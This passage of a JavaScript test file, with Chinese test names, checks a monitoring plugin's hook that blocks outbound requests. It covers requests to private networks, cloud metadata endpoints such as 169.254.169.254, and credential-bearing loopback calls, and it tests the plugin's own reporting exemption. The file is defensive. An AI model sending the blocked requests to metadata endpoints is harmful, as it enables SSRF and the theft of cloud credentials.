    it('字面量 *** 不算凭据（它不是秘密）⇒ 放行', () => {
      expect(
        hook.checkRequestBlocked({
          options: 'http://127.0.0.1:18789/',
          method: 'GET',
          headers: { Authorization: '***' },
        })
      ).toBeUndefined();
    });

    it('空值敏感头不算凭据 ⇒ 放行', () => {
      expect(
        hook.checkRequestBlocked({
          options: 'http://127.0.0.1:18789/',
          method: 'GET',
          headers: { Authorization: '   ' },
        })
      ).toBeUndefined();
    });
  });

  describe('判定不变：非回环目标', () => {
    it('RFC1918（10.x / 192.168.x）⇒ 仍然拦截', () => {
      expect(
        hook.checkRequestBlocked({ options: 'http://10.0.0.5/api', method: 'GET', headers: {} })
      ).toContain('blocked host');
      expect(
        hook.checkRequestBlocked({ options: 'http://192.168.1.10/api', method: 'GET', headers: {} })
      ).toContain('blocked host');
    });

    it('云元数据端点 ⇒ 仍然拦截', () => {
      expect(
        hook.checkRequestBlocked({ options: 'http://169.254.169.254/notify', method: 'GET', headers: {} })
      ).toContain('blocked host: 169.254.169.254');
      expect(
        hook.checkRequestBlocked({
          options: new URL('http://metadata.google.internal/x'),
          method: 'GET',
          headers: {},
        })
      ).toContain('blocked host: metadata.google.internal');
    });

    it('回环**带凭据**时元数据端点仍走 blocked host 口径（顺序不倒）', () => {
      expect(
        hook.checkRequestBlocked({
          options: 'http://169.254.169.254/notify',
          method: 'GET',
          headers: { Authorization: 'Bearer gx1234567890abcdef' },
        })
      ).toContain('blocked host');
    });
  });

  describe('事件路径（已脱敏的头）', () => {
    it('脱敏后的 Authorization: Bearer *** ⇒ 拦截', () => {
      expect(
        hook.shouldBlockRequest({
          host: '127.0.0.1:18789',
          url: '/',
          header: 'Authorization: Bearer ***',
        })
      ).toContain('loopback-credential');
    });

    it('脱敏后的 Cookie: sid=*** ⇒ 拦截', () => {
      expect(
        hook.shouldBlockRequest({
          host: '127.0.0.1:18789',
          url: '/',
          header: 'Cookie: sid=***',
        })
      ).toContain('loopback-credential');
    });

    it('只有 WebSocket 头的回环事件 ⇒ 放行', () => {
      expect(
        hook.shouldBlockRequest({
          host: '127.0.0.1:18789',
          url: '/',
          header: 'Sec-WebSocket-Version: 13\r\nConnection: Upgrade\r\nUpgrade: websocket',
        })
      ).toBeUndefined();
    });
  });

  describe('操作员仍可把回环加回黑名单（整表替换语义）', () => {
    it('OPENCLAW_NETWORK_BLOCKED_HOSTS=^127\\. ⇒ 回环被拦（部署侧收紧）', () => {
      process.env.OPENCLAW_NETWORK_BLOCKED_HOSTS = '^127\\.';
      const reloaded = loadHook();
      expect(
        reloaded.checkRequestBlocked({
          options: 'http://127.0.0.1:18789/',
          method: 'GET',
          headers: {},
        })
      ).toContain('blocked host');
      delete process.env.OPENCLAW_NETWORK_BLOCKED_HOSTS;
    });
  });

  describe('自上报豁免：本插件自己的上报流量不因"带凭据"被拦', () => {
    it('目标是 OPENCLAW_MONITOR_ENDPOINT ⇒ 放行', () => {
      process.env.OPENCLAW_MONITOR_ENDPOINT = 'http://127.0.0.1:9999/api/v1/events';
      const reloaded = loadHook();
      expect(
        reloaded.checkRequestBlocked({
          options: 'http://127.0.0.1:9999/api/v1/events',
          method: 'POST',
          headers: { Authorization: 'Bearer gx1234567890abcdef' },
        })
      ).toBeUndefined();
      delete process.env.OPENCLAW_MONITOR_ENDPOINT;
    });
  });
});
